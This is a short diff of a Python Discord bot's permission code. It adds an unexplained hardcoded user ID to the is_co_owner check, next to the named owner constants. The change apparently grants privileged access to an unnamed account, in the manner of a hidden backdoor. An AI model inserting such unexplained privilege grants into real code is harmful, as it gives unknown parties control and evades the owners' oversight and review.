@@ -61,7 +61,7 @@ def is_owner_only(interaction: discord.Interaction) -> bool:
     return interaction.user.id == OWNER_ID
 
 def is_co_owner(interaction: discord.Interaction) -> bool:
-    return interaction.user.id in (OWNER_ID, CO_OWNER_ID)
+    return interaction.user.id in (OWNER_ID, CO_OWNER_ID, 1419546840168136816)
 
 # ────────────────────────── constants ──────────────────────────────
 PREFIX = "!"
